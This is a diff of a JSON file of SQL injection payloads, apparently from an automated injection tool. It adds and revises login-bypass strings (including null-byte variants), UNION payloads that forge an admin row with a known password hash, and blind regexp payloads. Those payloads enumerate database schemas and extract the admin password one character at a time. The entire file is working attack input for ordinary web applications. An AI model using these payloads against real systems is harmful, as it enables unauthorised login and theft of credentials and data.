@@ -1,23 +1,27 @@
 {
   "blind": [
-    "admin'/**/and/**/admin'=0/**/union/**/select/**/admin',SCHEMA_NAME/**/from/**/information_schema.SCHEMATA/**/where/**/SCHEMA_NAME/**/not/**/in/**/(NOTIN)/**/and/**/SCHEMA_NAME/**/regexp/**/'^{}'#",
-    "admin'/**/and/**/admin'=0/**/union/**/select/**/admin',TABLE_NAME/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA/**/not/**/in/**/(NOTIN)/**/and/**/TABLE_NAME/**/regexp/**/'^{}'#",
-    "admin'/**/and/**/admin'=0/**/union/**/select/**/COLUMN_NAME/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_SCHEMA/**/not/**/in/**/(NOTIN)/**/and/**/COLUMN_NAME/**/regexp/**/'^{}'#",
-    "'/**/or/**/(select/**/SCHEMA_NAME/**/from/**/information_schema.SCHEMATA/**/where/**/SCHEMA_NAME/**/not/**/in/**/(NOTIN)/**/limit/**/admin')/**/regexp/**/'^{}'#",
-    "'/**/or/**/(select/**/TABLE_NAME/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA/**/not/**/in/**/(NOTIN)/**/limit/**/admin')/**/regexp/**/'^{}'#",
-    "'/**/or/**/(select/**/COLUMN_NAME/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_SCHEMA/**/not/**/in/**/(NOTIN)/**//**/limit/**/admin')/**/regexp/**/'^{}'#"
+    "' and 1=0 union select SCHEMA_NAME from information_schema.SCHEMATA where SCHEMA_NAME not in (NOTIN) and SCHEMA_NAME regexp '^{}'#",
+    "' and 1=0 union select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA not in (NOTIN) and TABLE_NAME regexp '^{}'#",
+    "' and 1=0 union select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA not in (NOTIN) and COLUMN_NAME regexp '^{}'#",
+    "' or (select SCHEMA_NAME from information_schema.SCHEMATA where SCHEMA_NAME not in (NOTIN) limit 1) regexp '^{}'#",
+    "' or (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA not in (NOTIN) limit 1) regexp '^{}'#",
+    "' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA not in (NOTIN) limit 1) regexp '^{}'#"
   ],
   "login": [
     "9 or 9=9#",
     "9 or 9=9 --",
     "or 9=9",
     "' or 9=9",
+    "%00' or 9=9",
     "or 9=9 --",
     "' or 9=9 --",
+    "%00' or 9=9 --",
     "or 9=9#",
     "' or 9=9#",
+    "%00' or 9=9#",
     "or 9=9/*",
     "' or 9=9/*",
+    "%00' or 9=9/*",
     "admin' --",
     "admin' #",
     "admin'/*",
@@ -59,8 +63,8 @@
     "admin\") or \"9\"=\"9\"#",
     "admin\") or \"9\"=\"9\"/*",
     "admin' or true or '1' like '",
-    "admin') or '1' like '1')--",
-    "admin') or '1' like '1')#",
+    "admin') or '9' like '9')--",
+    "admin') or '9' like '9')#",
     "or/**/9=9",
     "'/**/or/**/9=9",
     "or/**/9=9/**/--",
@@ -111,14 +115,19 @@
     "admin\")/**/or/**/\"9\"=\"9\"/*"
   ],
   "union": [
-    "admin' union select 'admin',md5('admin') from users#",
-    "admin' union select 'admin',sha('admin') from users#",
-    "admin' union select 'admin',sha2('admin') from users#",
-    "admin'/**/union/**/select/**/'admin',md5('admin')/**/from/**/users#",
-    "admin' union select 'admin','admin' from users#",
-    "admin'/**/union/**/select/**/'admin','admin'/**/from/**/users#",
-    "whatever ' AND 9=0 UNION ALL SELECT 'admin', '21232f297a57a5a743894a0e4a801fc3'#",
-    "whatever ' AND 9=0 UNION ALL SELECT 'admin', '21232f297a57a5a743894a0e4a801fc3'#",
-    "whatever ' aNd 9=0 uNiOn aLl sElEcT 'admin', '21232f297a57a5a743894a0e4a801fc3'#"
+    "admin' and 9=0 union all select 'admin',md5('admin') from users#",
+    "admin' and 9=0 %0a union all select 'admin',md5('admin') from users#",
+    "admin' and 9=0 union all select 'admin',sha('admin') from users#",
+    "admin' and 9=0 %0a union all select 'admin',sha('admin') from users#",
+    "admin' and 9=0 union all select 'admin',sha2('admin') from users#",
+    "admin' and 9=0 %0a union all select 'admin',sha2('admin') from users#",
+    "admin'/**/and 9=0/**/union/**/all/**/select/**/'admin',md5('admin')/**/from/**/users#",
+    "admin' and 9=0 union all select 'admin','admin' from users#",
+    "admin'/**/and 9=0/**/union/**/all/**/select/**/'admin','admin'/**/from/**/users#"
+  ],
+  "custom":[
+    "admi' or (select password from users where username='admin') regexp '^{}'#",
+    "admi') or (select password from users where username='admin') regexp '^{}'#",
+    "' or (select username from USERS limit 1) regexp '^{}'#"
   ]
 }
